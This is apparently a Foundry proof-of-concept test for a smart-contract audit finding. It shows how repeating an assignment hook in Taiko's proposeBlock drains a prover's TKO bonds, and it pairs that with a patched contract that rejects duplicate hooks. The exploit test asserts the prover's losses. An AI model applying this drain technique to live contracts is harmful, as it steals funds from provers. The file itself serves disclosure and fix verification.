// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import {
    AssignmentHook,
    Exploit,
    TaikoL1,
    Tko
} from "./35999-assignmenthooks-may-drain-prover-tko-when-calling-proposeblo.sol";

/// Report's fixes: one hook address per proposal, and the TKO credit must equal the bond.
contract TaikoL1Fixed {
    error L1_LIVENESS_BOND_NOT_RECEIVED();
    error DuplicateHook();

    Tko public tko;
    uint256 public livenessBond;

    constructor(Tko _tko, uint256 _livenessBond) {
        tko = _tko;
        livenessBond = _livenessBond;
    }

    function proposeBlock(address[] calldata hooks, uint8 v, bytes32 r, bytes32 s) external {
        uint256 tkoBalance = tko.balanceOf(address(this));
        address prev;
        for (uint256 i; i < hooks.length; ++i) {
            if (hooks[i] == prev) revert DuplicateHook();
            prev = hooks[i];
            AssignmentHook(hooks[i]).onBlockProposed(msg.sender, v, r, s);
        }
        if (tko.balanceOf(address(this)) != tkoBalance + livenessBond) {
            revert L1_LIVENESS_BOND_NOT_RECEIVED();
        }
    }
}

contract Finding35999Test is Test {
    function test_exploit_repeated_hook_drains_prover_tko() public {
        Exploit e = new Exploit();
        Tko tko = e.tko();
        address hook = address(e.hook());
        address prover = e.PROVER();
        uint256 pull = e.BOND() * e.PULLS();
        vm.prank(prover);
        tko.approve(hook, pull);
        assertEq(tko.allowance(prover, hook), pull, "allowance not stored");

        uint256 proverBefore = e.tko().balanceOf(e.PROVER());
        e.run();

        assertEq(e.tko().balanceOf(address(e.taiko())), 500 ether, "Taiko took 500 TKO");
        assertEq(e.tko().balanceOf(e.PROVER()), 5 ether, "prover kept only the fees");
        assertEq(proverBefore - e.tko().balanceOf(e.PROVER()), 495 ether, "prover lost 495 net");
        assertEq(e.tko().balanceOf(address(e)), 0, "attacker paid 5 TKO of fees");
        assertGt(e.tko().balanceOf(address(e.taiko())), e.BOND(), "more than one bond was taken");
    }

    function test_control_duplicate_hook_reverts_and_one_hook_pulls_the_bond() public {
        Tko tko = new Tko();
        AssignmentHook hook = new AssignmentHook(
            tko,
            100 ether,
            1 ether,
            0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266,
            0xd80bab8f9f3df0f1b5d9530e049de88535ffe8578bb7b02d0aac2c716e5e7eb5
        );
        TaikoL1Fixed fixedTaiko = new TaikoL1Fixed(tko, 100 ether);
        address prover = 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266;
        tko.mint(prover, 500 ether);
        tko.mint(address(this), 5 ether);
        vm.prank(prover);
        tko.approve(address(hook), 500 ether);
        tko.approve(address(hook), 5 ether);

        address[] memory five = new address[](5);
        for (uint256 i; i < 5; ++i) five[i] = address(hook);
        vm.expectRevert(TaikoL1Fixed.DuplicateHook.selector);
        fixedTaiko.proposeBlock(
            five,
            27,
            0xa8c0cdd93c6a6c2bf49a109af58552aba1ffcadc146aa88de83170d079d47a19,
            0x10a13eaf88cfd8b938aa66b8e0d8ec633c76b30eee49887c414487d98a20ffe8
        );
        assertEq(tko.balanceOf(prover), 500 ether, "failed proposal did not move TKO");
        assertEq(tko.balanceOf(address(fixedTaiko)), 0, "Taiko stayed empty");

        address[] memory one = new address[](1);
        one[0] = address(hook);
        fixedTaiko.proposeBlock(
            one,
            27,
            0xa8c0cdd93c6a6c2bf49a109af58552aba1ffcadc146aa88de83170d079d47a19,
            0x10a13eaf88cfd8b938aa66b8e0d8ec633c76b30eee49887c414487d98a20ffe8
        );
        assertEq(tko.balanceOf(address(fixedTaiko)), 100 ether, "exactly one bond");
        assertEq(tko.balanceOf(prover), 401 ether, "prover paid one bond and received one fee");
        assertEq(tko.balanceOf(address(this)), 4 ether, "proposer paid one fee");
    }
}
